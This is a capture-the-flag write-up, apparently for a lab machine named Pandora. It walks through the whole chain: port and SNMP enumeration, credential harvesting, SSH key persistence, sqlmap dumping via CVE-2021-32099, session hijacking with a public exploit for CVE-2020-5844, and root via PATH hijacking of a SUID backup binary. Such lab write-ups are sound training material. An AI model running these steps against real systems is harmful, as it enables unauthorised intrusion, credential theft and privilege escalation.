- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.11.136 -oG scan
	/opt/extractports scan
	nmap -p22,80 -Pn -sCV 10.10.11.136 -oN ports
	```

- I found the domain `panda.htb` and I add it to the file in the `hosts` file
- After accessing the website and browsing through it, I don't find anything relevant, so I decide to enumerate the ports using UDP.
- As a first step, I use brute-force to discover the community strings.
	
	```python
	onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.10.11.136
	```

- Having the community strings, I start to list the content and I find some credentials

	```python
	snmpwalk -v2c -c public 10.10.11.136
	```

- I validate the credentials found by ssh and get access to the system.

	```python
	ssh daniel@10.10.11.136
	```

- For a greater comfort at the time of connecting to the system, I generate a key that I add to the authorized_keys file to connect by ssh.
	
	```python
	ssh-keygen -f key
	cat key.pub
	echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /home/daniel/.ssh/authorized_keys
	ssh -i key daniel@10.10.11.136
	```

- I see that the first flag can be read by user matt.
- While searching the system for ways to perform a lateral move to the user matt, I find a website that I could not access previously. Using ssh I share port 80 to my machine to view it.

- After pointing in the hosts file `pandora.panda.htb` to my ip address, I get to see a CMS v7.0NG.742_FIX_PERL2020. Searching for information about it, I find several vulnerabilities.

	```python
	ssh -L 8089:localhost:80 daniel@10.10.11.136
	```
	![image](https://github.com/user-attachments/assets/6995be0d-3ce5-4d17-87d1-df6ce013a513)
	
- The first is CVE-2021-32099 which allows SQL injection. Using this vulnerability I can read the users that are registered in the database.

	```python
	sqlmap -u 'http://pandora.panda.htb:8089/pandora_console/include/chart_generator.php?session_id=*' --batch -D pandora -T tusuario -C email,id_user,is_admin.fullname,password --dump
	```

- I am unable to break the password. I continue enumerating the different tables and I find one that contains the active sessions.
- All of them belong to user daniel and only one to user matt. Using the latter and together with another of the existing CMS vulnerabilities (CVE-2020-5844) allows me to execute commands on the system as the user matt. I use this [repository](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated) to get an interactive shell
	
	![image](https://github.com/user-attachments/assets/864fb986-53a1-41d2-93b7-d2c6a161b629)
	
	```python
	python3 sqlpwn.py -t pandora.panda.htb:8089 
	```

- Having the terminal as the user matt I manage to read the first flag of the system.
- Then it performs a treatment of the tty because with the current one it does not allow me to perform some commands like `sudo -l`. I added my ssh key following the same steps I described previously.

	```bash
	script /dev/null -c bash
	Ctrl + z
	stty raw -echo; fg
	reset xterm
	export SHELL=bash
	export TERM=xterm
	stty rows 50 columns 116
	```

- For privilege escalation I start by listing the binaries with SUID permissions and find one that is not common. `/usr/bin/pandora_backup`

	![image](https://github.com/user-attachments/assets/16f66561-8356-4b08-adcf-81d2016b9fd6)

- I copy the binary to my machine and look at the strings it has. I notice that it executes the tar command using a relative path so we can perform an attack by spoofing the binary to execute a custom one.
	
	```python
	strings pandora_backup
	```
	
	![image](https://github.com/user-attachments/assets/02b1353e-f304-48bb-b18f-0974b764a57e)
	
- I create a binary containing the command we want to execute, modify the PATH variable to point first to our directory and execute the pandora_backup binary. This way we can become root and we can read the second flag of the system.
